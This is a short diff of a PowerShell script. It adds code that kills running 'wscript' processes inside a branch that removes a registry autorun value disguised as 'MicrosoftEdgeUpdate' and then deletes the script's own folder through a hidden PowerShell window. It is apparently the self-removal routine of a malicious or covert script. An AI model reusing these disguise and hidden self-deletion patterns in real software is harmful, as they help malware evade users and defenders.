@@ -173,6 +173,12 @@ while ($true) {
                         if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
                             Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
                         }
+                        $process = Get-Process "wscript" -ErrorAction SilentlyContinue
+
+                        if ($process) {
+                            $process | Stop-Process -Force
+                        }
+                        
                         Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
                         exit
                     }
